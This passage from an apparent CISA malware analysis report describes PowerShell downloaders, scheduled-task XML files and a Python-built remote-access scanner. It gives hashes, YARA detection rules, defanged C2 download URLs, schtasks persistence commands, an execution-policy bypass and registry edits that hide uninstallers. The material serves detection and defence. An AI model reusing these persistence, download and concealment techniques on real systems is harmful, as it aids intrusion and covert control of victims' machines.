terminators\n\n\nMD5\ne4ea99b9a35807bae6bc2885b220c498\n\n\nSHA1\n26cb85e6c339050b49f6854df338928e21b7c512\n\n\nSHA256\nc357879e2c1013dcf999bcdc65372eacf0895af4a4b4bad2b7d28108d3e7c46a\n\n\nSHA512\n621d4442c4fae8a7fcb47d53fdf38e2facfef833ec4d8fead4a88a113ebe0574674b06afb9496f4f31ad918864509df049008094b71b06e18307413276eeb79f\n\n\nssdeep\n48:yeiqq97yNTFL1eb9c9V9LTra+iaiudupRCRfMufAuRa7G5X3l+3BNdHPsV8iDdvQ:cU4pwdiaigVMll7UY5HFQ+\n\n\nEntropy\n3.586698\n\n\nPath\nC:\\Users\\Public\\Downloads\\this.xml\n\n\n\nAntivirus\nNo matches found.\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nRelationships\n\n\n\nc357879e2c...\nDownloaded_By\n1d459b9909adf98690635c62ea005009ede8eb9a665b8703fe2ad0b0c414816b\n\n\nc357879e2c...\nUsed\n66.70.238.65\n\n\nc357879e2c...\nDownloaded_By\n76a2979d965d42f99558ca6ecd97734697249667291a3013d611e310a03f550e\n\n\n\nDescription\nThis artifact is the scheduled task XML file downloaded and installed by \"8aedb094121903a3bfc3dade34f48126\" and \"a439e7a030d52c8d31bf2c140ccf216b\". This file and \"d5e111c8cea4d2c8e8ae15a570ff8d3d\" have similar code functions. It contains the task's properties, triggers, actions, conditions, and settings used to create a scheduled task named \"Runtime Service\" for persistence. It is designed to execute the Python compiled PE file from \"C:\\Program Files (x86)\\Nmap\\RuntimeService.exe\" with the arguments below in every system reboot.\n\n\t\t\t--Begin arguments--\n\t\t\t[C2 server IP address] [Port number] [threads]\n\t\t\t66[.]70[.]238[.]65 50106 250\n\t\t\t--End arguments--\nScreenshots\n \n\nFigure 5 - A snippet of the contents of the XML file \"this.xml\".\n\n \n\nFigure 6 - The scheduled task named \"Runtime Service\" created from the tasks specified in the XML file \"this.xml\" to execute the file \"C:\\Program Files (x86)\\Nmap\\RuntimeService.exe\" with the arguments below in every system reboot.\n\n\n\n4cdd06a36858ac32a09606bfecb54b517ad41a6aac1e37ca56bb1c193f8174cf\nTags\nremote-access-trojantrojan\nDetails\n\n\n\nName\nRuntimeService.exe\n\n\nSize\n14247178 bytes\n\n\nType\nPE32+ executable (console) x86-64, for MS Windows\n\n\nMD5\neda057d006561e28563813b2e81b9fd0\n\n\nSHA1\nabb73373785f968216d375e4b3de2b6d9f7d093d\n\n\nSHA256\n4cdd06a36858ac32a09606bfecb54b517ad41a6aac1e37ca56bb1c193f8174cf\n\n\nSHA512\n605dfc6190834a28173aed088b18fa1e860c292d69149d9f12cb1d2d0455f705bf1fcbc37941557a3cc5a1e4d04854b681f064413b91401aeea5b480b04e1d50\n\n\nssdeep\n393216:t1IVOqPfG3GH6YkN9c5hlER6QMNjAeNrHPAdZYyZyYrfaMwtHD:9afcGHfAEhk6Q9eNrAdZZjzax\n\n\nEntropy\n7.995019\n\n\n\nAntivirus\nNo matches found.\nYARA Rules\nNo matches found.\nssdeep Matches\nNo matches found.\nPE Metadata\n\n\n\nCompile Date\n2021-11-09 13:03:59-05:00\n\n\nImport Hash\n51a5e6ba413b3d4c2f9ffde72d1f2a95\n\n\n\nPE Sections\n\n\n\nMD5\nName\nRaw Size\nEntropy\n\n\n40c4d7cdac0f09d238411df87fd0be0f\nheader\n1024\n2.929699\n\n\n296184d617a998fb5244b87ad131770c\n.text\n162816\n6.493682\n\n\nef931db6e8a997c4ba0b405b31b5349c\n.rdata\n72192\n5.730013\n\n\nffa48c07142397865c293efb2dc70cb6\n.data\n3584\n1.810884\n\n\n2b2684f42c4fc5ca696311223fc0c0d3\n.pdata\n8704\n5.277038\n\n\n27cd2196d9e6b2418e3874d945121423\n_RDATA\n512\n1.992418\n\n\n80e1652b945aa32b3142f28a4d4c69b6\n.rsrc\n69632\n5.186849\n\n\ncf5992ed51a42f136642584614acc53c\n.reloc\n2048\n5.255159\n\n\n\nPackers/Compilers/Cryptors\n\n\n\nMicrosoft Visual C++ 8.0 (DLL)\n\n\n\nRelationships\n\n\n\n4cdd06a368...\nDownloaded_By\n1d459b9909adf98690635c62ea005009ede8eb9a665b8703fe2ad0b0c414816b\n\n\n4cdd06a368...\nDownloaded_By\n76a2979d965d42f99558ca6ecd97734697249667291a3013d611e310a03f550e\n\n\n\nDescription\nThis artifact is a 64-bit Python 3.9 compiled executable downloaded and installed by \"this.ps1\" (8aedb094121903a3bfc3dade34f48126). The file is executed by scheduled task named \"Runtime Service\" from the task specified in the XML file \"C:\\Users\\Public\\Downloads\\this.xml\" on the victim's system. It executes the file with the arguments below in every system reboot.\n\n\t\t\t--Begin arguments--\n\t\t\t[C2 server IP address] [Port number] [threads]\n\t\t\t66[.]70[.]238[.]65 50106 250\n\t\t\t--End arguments--\n\n\t\t\tWhen executed, it attempts to connect to the specified C2 IP address and port and waits for a response. The response payload was not available for analysis. Analysis indicates that once the response is received, it is designed to perform the functions below:\n\n\t\t\t--Begin functions--\n\t\t\tIt is capable of using FreeProxy class to scrape proxies from proxy sources: https[:]//free-proxy-list[.]net and https[:]//www[.]sslproxies[.]org and checks if proxy is working. It can filter proxies by acceptable timeout and randomize the list of proxies from where the script would get the first working proxy.\n\t\t\tIt is capable of scanning multiple endpoints using Nmap NSE scripts. It is capable of running specified Nmap NSE scripts to perform a variety of tasks and store the output in JSON format.\n\t\t\tIt is capable of performing scans to find out all IP addresses of live hosts, open ports and services running on those hosts.\n\t\t\tIt is capable of performing banner grabbing: find open ports of a host and grab different banners of services available on different ports.\n\t\t\tIt is capable of collecting public key certificates information from the compromised system.\n\t\t\tIt is capable of starting and closing socks connection.\n\t\t\tThe scanned results and the collected information can be sent in JSON format through a specified socket to the attacker's C2 server.\n\t\t\t--End functions--\n\n\t\t\tDisplayed below are the hard-coded ports scanned at runtime:\n\n\t\t\t--Begin ports--\n\t\t\t22\n\t\t\t80\n\t\t\t8080\n\t\t\t8888\n\t\t\t8060\n\t\t\t8081\n\t\t\t443\n\t\t\t1443\n\t\t\t2443\n\t\t\t3443\n\t\t\t4443\n\t\t\t5443\n\t\t\t6443\n\t\t\t7443\n\t\t\t8443\n\t\t\t9443\n\t\t\t10443\n\t\t\t11443\n\t\t\t12443\n\t\t\t3389\n\t\t\t9200\n\t\t\t27017\n\t\t\t3306\n\t\t\t1433\n\t\t\t5432\n\t\t\t--End ports\n\n\t\t\tDisplayed below are the hard-coded services scanned at runtime:\n\n\t\t\t--Begin services--\n\t\t\t22: 'ssh'\n\t\t\t80: 'http'\n\t\t\t443: 'https'\n\t\t\t1433: 'ms-sql-s'\n\t\t\t3389: 'ms-wbt-server'\n\t\t\t5432: 'postgresql'\n\t\t\t3306: 'mysql'\n\t\t\t9200: 'wap-wsp'\n\t\t\t8080: 'http-proxy'\n\t\t\t8081: 'blackice-icecap'\n\t\t\t8888: 'sun-answerbook'\n\t\t\t8060: 'aero'\n\t\t\t1443: 'ies-lm'\n\t\t\t2443: 'powerclientcsf'\n\t\t\t3443: 'ov-nnm-websrv'\n\t\t\t4443: 'pharos'\n\t\t\t5443: 'spss'\n\t\t\t6443: 'm2ap'\n\t\t\t7443: 'oracleas-https'\n\t\t\t8443: 'https-alt'\n\t\t\t9443: 'tungsten-https'\n\t\t\t27017: 'mongodb'\n\t\t\t10443: 'cirrossp'\n\t\t\t11443: 'unknown'\n\t\t\t12443: 'unknown\n\t\t\t--End services--\n\n\t\t\tDisplayed below is the format of the public key certificates data collected at runtime:\n\n\t\t\t--Begin certificate information--\n\t\t\tSubject: The certificate's subject\n\t\t\tIssuer: The certificate's issuer\n\t\t\tHas-expired: x509 cert has expired\n\t\t\tNot-after: The not after portion of the certificate's validity period\n\t\t\tNot-before: The not before portion of the certificate's validity period\n\t\t\tSerial-number: The certificate's serial number\n\t\t\tSerial-number(hex): The certificate's serial number in hexadecimal\n\t\t\tSignature-algorithm: The certificate's signature algorithm\n\t\t\tVersion: The X.509 version number\n\t\t\tPulic-key-length: The certificate public key length\n\t\t\tExtensions': The X.509 extensions\n\t\t\t--End certificate information--\nScreenshots\n \n\nFigure 7 - A snippet of the contents of the decompiled Python script that were compiled into the PE executable file.\n\n\n\n817046c4fe89cd44dbb613cdac2f0c165e2b47d2b5245911ca6fabdda89d1691\nTags\ndownloaderloadertrojan\nDetails\n\n\n\nName\nthis.ps1\n\n\nSize\n7864 bytes\n\n\nType\nASCII text, with very long lines\n\n\nMD5\n1940ddb77882162f898bc3aae9c67d94\n\n\nSHA1\nf85e827f183c0c2914dae2928c169af2fd8fc483\n\n\nSHA256\n817046c4fe89cd44dbb613cdac2f0c165e2b47d2b5245911ca6fabdda89d1691\n\n\nSHA512\nac460452c2af221b9e7083fda5603568273bdfaad071f717548dd641eb4f88226d0987957658b92c2a2c7f6825ee30cf404212cb5bd8b58c3bac4e018fa4ff56\n\n\nssdeep\n192:GhLS17M/m8MxmBV8xk17M/mUcMHRRryV8xk17M/mZCHCuX8Mcoyar:4UwDuiww8RMwls1bu\n\n\nEntropy\n5.224935\n\n\nPath\nC:\\Users\\Public\\Downloads\\this.ps1\n\n\n\nAntivirus\n\n\n\nESET\nPowerShell/TrojanDownloader.Agent.EQN trojan\n\n\n\nYARA Rules\n\nrule CISA_10386789_01 : downloader\n\t\t\t\t{\n\t\t\t\t\u00a0\u00a0\u00a0meta:\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Author = \"CISA Code & Media Analysis\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Incident = \"10386789\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Date = \"2022-06-08\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Last_Modfied = \"20220613_1130\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Actor = \"n/a\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Category = \"Downloader\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Family = \"n/a\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Description = \"Detects PowerShell downloader samples\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0MD5_1 = \"8aedb094121903a3bfc3dade34f48126\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0SHA256_1 = \"1d459b9909adf98690635c62ea005009ede8eb9a665b8703fe2ad0b0c414816b\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0MD5_2 = \"1940ddb77882162f898bc3aae9c67d94\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0SHA256_2 = \"817046c4fe89cd44dbb613cdac2f0c165e2b47d2b5245911ca6fabdda89d1691\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0MD5_3 = \"84aadb11699f0c3ed062f484aa0a622e\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0SHA256_3 = \"e6bc8aa44233312058704b4d5954c45b4160841f470dd7f6d13c08940e61a7bb\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0MD5_4 = \"a439e7a030d52c8d31bf2c140ccf216b\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0SHA256_4 = \"76a2979d965d42f99558ca6ecd97734697249667291a3013d611e310a03f550e\"\n\t\t\t\t\u00a0\u00a0\u00a0strings:\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$s0 = { 44 6F 63 75 6D 65 6E 74 73 5C 70 73 2E 70 73 31 }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$s1 = { 44 6F 77 6E 6C 6F 61 64 73 5C 65 6C 61 73 74 69 63 73 65 61 72 63 68 2E 6E 73 65 }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$s2 = { 5C 55 6E 69 6E 73 74 61 6C 6C 5C 4E 70 63 61 70 49 6E 73 74 }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$s3 = { 5C 55 6E 69 6E 73 74 61 6C 6C 5C 4E 6D 61 70 }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$s4 = { 2F 44 65 6C 65 74 65 20 2F 74 6E 20 22 52 75 6E 74 69 6D 65 20 53 65 72 76 69 63 65 22 }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$s5 = { 44 6F 77 6E 6C 6F 61 64 73 5C 6E 2E 7A 69 70 22 }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$s6 = { 5C 4D 69 63 72 6F 73 6F 66 74 5C 57 69 6E 64 6F 77 73 5C 52 75 6E 74 69 6D 65 20 55 70 64 61 74 65 20 53 65 72 76 69 63 65 }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$s7 = { 44 6F 77 6E 6C 6F 61 64 73 5C 6E 6D 61 70 2E 65 78 65 22 }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$t8 = { 6D 61 74 63 68 20 22 73 79 73 74 65 6D 70 72 6F 66 69 6C 65 }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$t9 = { 2D 6E 6F 74 6D 61 74 63 68 20 22 41 70 70 44 61 74 61 }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$t10 = { 20 6B 69 6C 6C 20 2D 49 64 20 }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$t11 = { 2F 52 75 6E 20 2F 74 6E 20 22 52 75 6E 74 69 6D 65 20 53 65 72 76 69 63 65 }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$t12 = { 44 6F 77 6E 6C 6F 61 64 73 5C 74 68 69 73 2E 70 73 31 }\n\t\t\t\t\u00a0\u00a0\u00a0condition:\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0all of ($s*) or all of ($t*)\n\t\t\t\t}\n\nssdeep Matches\nNo matches found.\nRelationships\n\n\n\n817046c4fe...\nContains\n66.70.238.65\n\n\n817046c4fe...\nConnected_To\n66.70.238.65\n\n\n817046c4fe...\nDownloaded\nb050749c87399f9978cc6eaea7d25405fc0d099a14c169f5c5f63b8b6ec98b0f\n\n\n817046c4fe...\nDownloaded\n6408217e10fac9f6549ffaaab328bcfeed4a7ebea71f3dcf60f6186e1b21b501\n\n\n817046c4fe...\nDownloaded\n407d60626707baee29fb9f2597dd32cfd544ff46df7f76e51ff0b79b3ffce3f2\n\n\n817046c4fe...\nDownloaded\n42c844c62ad1b7ae1925973a9b6845b40d4f626a4895cba9ae9e3e3de3f7973a\n\n\n817046c4fe...\nDownloaded_By\ne6bc8aa44233312058704b4d5954c45b4160841f470dd7f6d13c08940e61a7bb\n\n\n\nDescription\nThis artifact is a malicious PowerShell script file downloaded and installed by \"ps.ps1\" (84aadb11699f0c3ed062f484aa0a622e). This file and \"8aedb094121903a3bfc3dade34f48126\" have similar code functions. When executed, it stops and deletes the running scheduled tasks below if they exist on the compromised system:\n\n\t\t\t--Begin task name--\n\t\t\t\"Runtime Service\"\n\t\t\t\"\\Microsoft\\Windows\\Runtime Update Service\"\n\t\t\t--End task name--\n\n\t\t\tIt downloads and installs a scheduled task XML file and a PowerShell file below if the file \"C:\\Program Files (x86)\\Nmap\\RuntimeService.exe\" is installed on the compromised system:\n\n\t\t\t--Begin files--\n\t\t\tC:\\Users\\Public\\Downloads\\that.xml ==> \"80343fb39fe8657f3f3904509b59d1d2\"\n\t\t\tC:\\Users\\Public\\Documents\\ps.ps1\n\t\t\t--End files--\n\n\t\t\tIt creates a scheduled task named \"Runtime Update Service\" from the task specified in the above XML file to execute the file \"C:\\Users\\Public\\Documents\\ps.ps1\" at a specified time of each day for persistence, and then exits it code execution.\n\n\t\t\tDisplayed below is the command used to install the scheduled task named \"\\Microsoft\\Windows\\Runtime Update Service\":\n\n\t\t\t--Begin scheduled task--\n\t\t\t\"schtasks.exe /Create /XML \"C:\\Users\\Public\\Downloads\\that.xml\" /tn \"\\Microsoft\\Windows\\Runtime Update Service\"\n\t\t\t--End scheduled task--\n\n\t\t\tIf not, it checks if the Nmap file path \"C:\\Program Files (x86)\\Nmap\" is installed on the victim's system. If the file path exists, it will search for the running process named \"RuntimeService\", which is the 64-bit Python compiled PE file. It will attempt to terminate and delete it from \"C:\\Program Files (x86)\\Nmap\\RuntimeService.exe\" if the file is running. It downloads and installs a scheduled task XML file and the Python compiled PE file. It copies the PE file from \"C:\\Users\\Public\\Downloads\\RuntimeService.exe\" to the Nmap installed folder \"C:\\Program Files (x86)\\Nmap\\RuntimeService.exe\".\n\n\t\t\tDisplayed below are the scheduled task XML file and PE file installed at runtime:\n\n\t\t\t--Begin files--\n\t\t\tC:\\Users\\Public\\Downloads\\this.xml ==> \"d5e111c8cea4d2c8e8ae15a570ff8d3d\"\n\t\t\tC:\\Users\\Public\\Downloads\\RuntimeService.exe ==> copied to C:\\Program Files (x86)\\Nmap\\RuntimeService.exe. ==> \"172fbaf8328f5622a0f69f6cb3b346ac\"\n\t\t\t--End files--\n\n\t\t\tIt creates a scheduled task named \"Runtime Service\" from the task specified in the above \"this.xml\" file on the victim's system to execute the PE file \"C:\\Program Files (x86)\\Nmap\\RuntimeService.exe\" with predefined arguments in every system reboot for persistence.\n\n\t\t\tDisplayed below is the command used to install the scheduled task named \"Runtime Service\":\n\n\t\t\t--Begin scheduled task--\n\t\t\t\"schtasks.exe /Create /XML \"C:\\Users\\Public\\Downloads\\this.xml\" /tn \"Runtime Service\"\n\t\t\t--End scheduled task--\n\n\t\t\tIf the Nmap file path \"C:\\Program Files (x86)\\Nmap\" is not installed on the victim's system, it will download a zip file from its C2 server to \"C:\\Users\\Public\\Downloads\\n.zip\". The zip file contains the Nmap installer and the NSE file. It installs the Nmap installer on the compromised system with the command below:\n\n\t\t\t--Begin command--\n\t\t\tstart \"C:\\Users\\Public\\Downloads\\Nmap.exe\" \"/S\"\n\t\t\t--End command--\n\n\t\t\tIt will download the files RuntimeService.exe, this.xml, that.xml, and ps.ps1 files from its C2 server into \"C:\\Users\\Public\\Downloads\\\".\n\n\t\t\tIt copies the NSE file from the current directory \"C:\\Users\\Public\\Downloads\\elasticsearch.nse\" to \"C:\\Program Files (x86)\\Nmap\\scripts\\elasticsearch.nse\", and the Python PE file \"C:\\Users\\Public\\Downloads\\RuntimeService.exe\" to \"C:\\Program Files (x86)\\Nmap\\RuntimeService.exe\". It creates scheduled tasks named \"Runtime Service\" and \"Runtime Update Service\" from the task specified in the above XML files on the victim's system for persistence.\n\n\t\t\tIt deletes the command line for removing the Nmap application and the Nmap project's packet capture (Npcap) installed from the registry by changing the \"UninstallString\" registry value to a null string under the following registry keys:\n\n\t\t\t--Begin registry entries--\n\t\t\t\"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\NpcapInst\"\n\t\t\t\"UninstallString\"=\"C:\\Program Files\\Npcap\\uninstall.exe\"\n\n\t\t\t\"HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\Nmap\"\n\t\t\t\"UninstallString\" = \"C:\\Program Files (x86)\\Nmap\\uninstall.exe\"\n\t\t\t--End registry entries--\n\n\t\t\tIt deletes the files below from the victim's system:\n\n\t\t\t--Begin files--\n\t\t\tC:\\Users\\Public\\Downloads\\nmap.exe\n\t\t\tC:\\Users\\Public\\Downloads\\elasticsearch.nse\n\t\t\tC:\\Users\\Public\\Downloads\\n.zip\n\t\t\tC:\\Users\\Public\\Downloads\\RuntimeService.exe\n\t\t\tC:\\Users\\Public\\Downloads\\this.xml\n\t\t\tC:\\Users\\Public\\Downloads\\that.xml\"\n\t\t\t--End files--\n\n\t\t\tDisplayed below are the list of Uniform Resource Identifiers (URIs) used to download the files above:\n\n\t\t\t--Begin URIs--\n\t\t\thttp[:]//66[.]70[.]238[.]65/RuntimeService.exe\n\t\t\thttp[:]//66[.]70[.]238[.]65/this.xml\n\t\t\thttp[:]//66[.]70[.]238[.]65/that.xml\n\t\t\thttp[:]//66[.]70[.]238[.]65/ps.ps1\n\t\t\thttp[:]//66[.]70[.]238[.]65/n.zip\n\t\t\t--End URIs--\nScreenshots\n \n\nFigure 8 -  A snippet of the contents of the PowerShell script file \"this.ps1\".\n\n\n\ne6bc8aa44233312058704b4d5954c45b4160841f470dd7f6d13c08940e61a7bb\nTags\ndownloaderloadertrojan\nDetails\n\n\n\nName\nps.ps1\n\n\nSize\n4964 bytes\n\n\nType\nASCII text, with very long lines\n\n\nMD5\n84aadb11699f0c3ed062f484aa0a622e\n\n\nSHA1\n4520316661d882fcaa2318ad3d851d07484fb4bf\n\n\nSHA256\ne6bc8aa44233312058704b4d5954c45b4160841f470dd7f6d13c08940e61a7bb\n\n\nSHA512\n8faec201cb621ebf8154a67b469ec1339cc1b9ffbf743a8d6bb18b52b2defc851611247c85ba4c6d3c6cfad858e20813fbcc675eca767803d3b0421177c74eb8\n\n\nssdeep\n96:VvVo0BONyrMgrHczu8XeSCOrGxxut6Qx17zIczQAut3d/z2vXeS:VvVjhLr8XeSCOrGxxGx17McMxNdr2PeS\n\n\nEntropy\n5.155303\n\n\nPath\nC:\\Users\\Public\\Documents\\ps.ps1\n\n\n\nAntivirus\n\n\n\nESET\nPowerShell/TrojanDownloader.Agent.EQN trojan\n\n\n\nYARA Rules\n\nrule CISA_10386789_01 : downloader\n\t\t\t\t{\n\t\t\t\t\u00a0\u00a0\u00a0meta:\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Author = \"CISA Code & Media Analysis\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Incident = \"10386789\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Date = \"2022-06-08\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Last_Modfied = \"20220613_1130\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Actor = \"n/a\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Category = \"Downloader\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Family = \"n/a\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0Description = \"Detects PowerShell downloader samples\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0MD5_1 = \"8aedb094121903a3bfc3dade34f48126\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0SHA256_1 = \"1d459b9909adf98690635c62ea005009ede8eb9a665b8703fe2ad0b0c414816b\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0MD5_2 = \"1940ddb77882162f898bc3aae9c67d94\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0SHA256_2 = \"817046c4fe89cd44dbb613cdac2f0c165e2b47d2b5245911ca6fabdda89d1691\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0MD5_3 = \"84aadb11699f0c3ed062f484aa0a622e\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0SHA256_3 = \"e6bc8aa44233312058704b4d5954c45b4160841f470dd7f6d13c08940e61a7bb\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0MD5_4 = \"a439e7a030d52c8d31bf2c140ccf216b\"\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0SHA256_4 = \"76a2979d965d42f99558ca6ecd97734697249667291a3013d611e310a03f550e\"\n\t\t\t\t\u00a0\u00a0\u00a0strings:\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$s0 = { 44 6F 63 75 6D 65 6E 74 73 5C 70 73 2E 70 73 31 }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$s1 = { 44 6F 77 6E 6C 6F 61 64 73 5C 65 6C 61 73 74 69 63 73 65 61 72 63 68 2E 6E 73 65 }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$s2 = { 5C 55 6E 69 6E 73 74 61 6C 6C 5C 4E 70 63 61 70 49 6E 73 74 }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$s3 = { 5C 55 6E 69 6E 73 74 61 6C 6C 5C 4E 6D 61 70 }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$s4 = { 2F 44 65 6C 65 74 65 20 2F 74 6E 20 22 52 75 6E 74 69 6D 65 20 53 65 72 76 69 63 65 22 }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$s5 = { 44 6F 77 6E 6C 6F 61 64 73 5C 6E 2E 7A 69 70 22 }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$s6 = { 5C 4D 69 63 72 6F 73 6F 66 74 5C 57 69 6E 64 6F 77 73 5C 52 75 6E 74 69 6D 65 20 55 70 64 61 74 65 20 53 65 72 76 69 63 65 }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$s7 = { 44 6F 77 6E 6C 6F 61 64 73 5C 6E 6D 61 70 2E 65 78 65 22 }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$t8 = { 6D 61 74 63 68 20 22 73 79 73 74 65 6D 70 72 6F 66 69 6C 65 }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$t9 = { 2D 6E 6F 74 6D 61 74 63 68 20 22 41 70 70 44 61 74 61 }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$t10 = { 20 6B 69 6C 6C 20 2D 49 64 20 }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$t11 = { 2F 52 75 6E 20 2F 74 6E 20 22 52 75 6E 74 69 6D 65 20 53 65 72 76 69 63 65 }\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0$t12 = { 44 6F 77 6E 6C 6F 61 64 73 5C 74 68 69 73 2E 70 73 31 }\n\t\t\t\t\u00a0\u00a0\u00a0condition:\n\t\t\t\t\u00a0\u00a0\u00a0 \u00a0\u00a0\u00a0all of ($s*) or all of ($t*)\n\t\t\t\t}\n\nssdeep Matches\nNo matches found.\nRelationships\n\n\n\ne6bc8aa442...\nDownloaded\nb050749c87399f9978cc6eaea7d25405fc0d099a14c169f5c5f63b8b6ec98b0f\n\n\ne6bc8aa442...\nDownloaded\n6408217e10fac9f6549ffaaab328bcfeed4a7ebea71f3dcf60f6186e1b21b501\n\n\ne6bc8aa442...\nDownloaded\n407d60626707baee29fb9f2597dd32cfd544ff46df7f76e51ff0b79b3ffce3f2\n\n\ne6bc8aa442...\nDownloaded\n817046c4fe89cd44dbb613cdac2f0c165e2b47d2b5245911ca6fabdda89d1691\n\n\ne6bc8aa442...\nContains\n66.70.238.65\n\n\ne6bc8aa442...\nConnected_To\n66.70.238.65\n\n\n\nDescription\nThis artifact is a malicious PowerShell script file downloaded and installed by \"this.ps1\" (1940ddb77882162f898bc3aae9c67d94). This file and \"a439e7a030d52c8d31bf2c140ccf216b\" have similar code functions. When executed, it checks and stops any process running from the specified paths:\n\n\t\t\t--Begin file paths--\n\t\t\tC:\\Windows\\Temp\n\t\t\tC:\\Windows\\System32\\config\\systemprofile\n\t\t\t--End file paths--\n\n\t\t\tIf not, it checks if the scheduled task named \"Runtime Service\" is installed on the victim's system. If not, it downloads and installs the XML scheduled task file \"C:\\Users\\Public\\Downloads\\this.xml\" (d5e111c8cea4d2c8e8ae15a570ff8d3d) and creates scheduled task named \"Runtime Service\" from the task specified in the XML file on the victim's system. This task is designed to execute the PE file \"C:\\Program Files (x86)\\Nmap\\RuntimeService.exe\" with predefined arguments in every system reboot for persistence.\n\n\t\t\tIt checks if the schedule task named \"\\Microsoft\\Windows\\Runtime Update Service\" is installed on the victim's system. If not, it downloads and installs the XML scheduled task file \"C:\\Users\\Public\\Downloads\\that.xml\" (80343fb39fe8657f3f3904509b59d1d2) and creates a scheduled task named \"\\Microsoft\\Windows\\Runtime Update Service\" from the task specified in the XML file on the victim's system. This task is designed to run the PowerShell script file C:\\Users\\Public\\Documents\\ps.ps1\" in a specified date and time.\n\n\t\t\tIt checks if the Nmap file path \"C:\\Program Files (x86)\\Nmap\" is installed on the victim's system. If the file path is not installed, it downloads a PowerShell file from its C2 server to \"C:\\Users\\Public\\Downloads\\this.ps1\" (1940ddb77882162f898bc3aae9c67d94) before executing it using the command below:\n\n\t\t\t--Begin command--\n\t\t\t\"Powershell.exe -ExecutionPolicy UnRestricted -File \"C:\\Users\\Public\\Downloads\\this.ps1\"\n\t\t\t--End command--\n\n\t\t\tIf the Nmap file path is installed, it checks if the PE file \"C:\\Program Files (x86)\\Nmap\\RuntimeService.exe\" (172fbaf8328f5622a0f69f6cb3b346ac) is also installed on the victim's system. If the PE file is not installed, it downloads and installs the PE file into \"C:\\Users\\Public\\Downloads\\RuntimeService.exe\" (172fbaf8328f5622a0f69f6cb3b346ac) if the PE file is not installed on the victim's system. It copies the PE file from 